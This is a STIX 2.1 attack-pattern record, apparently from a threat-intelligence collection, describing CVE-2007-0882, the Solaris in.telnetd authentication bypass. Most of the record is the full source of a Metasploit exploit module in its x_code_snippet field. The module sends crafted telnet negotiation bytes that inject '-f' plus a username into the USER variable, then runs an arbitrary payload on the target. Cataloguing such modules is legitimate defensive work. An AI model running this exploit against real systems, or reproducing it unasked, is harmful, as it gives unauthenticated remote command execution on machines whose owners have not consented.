{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9979a0ea-9fba-4660-9486-e9090ccd0ccf",
    "created": "2024-08-14T16:33:56.073068Z",
    "modified": "2024-08-14T16:33:56.073072Z",
    "name": "Sun Solaris Telnet Remote Authentication Bypass Vulnerability",
    "description": " This module exploits the argument injection vulnerability in the telnet daemon (in.telnetd) of Solaris 10 and 11. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/solaris/telnet/fuser.rb",
            "external_id": "fuser.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-0882"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Sun Solaris Telnet Remote Authentication Bypass Vulnerability',\n      'Description'    => %q{\n        This module exploits the argument injection vulnerability\n        in the telnet daemon (in.telnetd) of Solaris 10 and 11.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2007-0882' ],\n          [ 'OSVDB', '31881'],\n          [ 'BID', '22512' ],\n        ],\n      'Privileged'     => false,\n      'Platform'       => %w{ solaris unix },\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          'Space'    => 2000,\n          'BadChars' => '',\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl telnet',\n            }\n        },\n      'Targets'        =>\n        [\n          ['Automatic', { }],\n        ],\n      'DisclosureDate' => '2007-02-12',\n      'DefaultTarget' => 0))\n\n      register_options(\n        [\n          Opt::RPORT(23),\n          OptString.new('USER', [ true, \"The username to use\",     \"bin\" ]),\n        ])\n  end\n\n  def exploit\n    connect\n\n    print_status('Setting USER environment variable...')\n\n    req =  \"\\xFF\\xFD\\x26\\xFF\\xFB\\x26\\xFF\\xFD\\x03\\xFF\\xFB\"\n    req << \"\\x18\\xFF\\xFB\\x1F\\xFF\\xFB\\x20\\xFF\\xFB\\x21\\xFF\"\n    req << \"\\xFB\\x22\\xFF\\xFB\\x27\\xFF\\xFD\\x05\"\n\n    sock.put(req)\n    sock.get_once\n\n    req << \"\\xFF\\xFC\\x25\"\n\n    sock.put(req)\n    sock.get_once\n\n    req << \"\\xFF\\xFA\\x26\\x01\\x01\\x02\\xFF\\xF0\"\n\n    sock.put(req)\n    sock.get_once\n\n    req << \"\\xFF\\xFA\\x1F\\x00\\x50\\x00\\x18\\xFF\\xF0\"\n\n    sock.put(req)\n    sock.get_once\n\n    req << \"\\xFF\\xFE\\x26\\xFF\\xFC\\x23\\xFF\\xFC\\x24\"\n\n    sock.put(req)\n    sock.get_once\n\n    req =  \"\\xFF\\xFA\\x18\\x00\\x58\\x54\\x45\\x52\\x4D\\xFF\"\n    req << \"\\xF0\\xFF\\xFA\\x27\\x00\\x00\\x55\\x53\\x45\\x52\"\n    req << \"\\x01\\x2D\\x66\" + datastore['USER'] + \"\\xFF\\xF0\"\n\n    sock.put(req)\n    sock.get_once\n    select(nil,nil,nil,0.25)\n\n    sock.put(\"nohup \" + payload.encoded + \" >/dev/null 2>&1\\n\")\n\n    select(nil,nil,nil,0.25)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-02-12",
    "x_mitre_platforms": [
        "%w{ solaris unix }"
    ]
}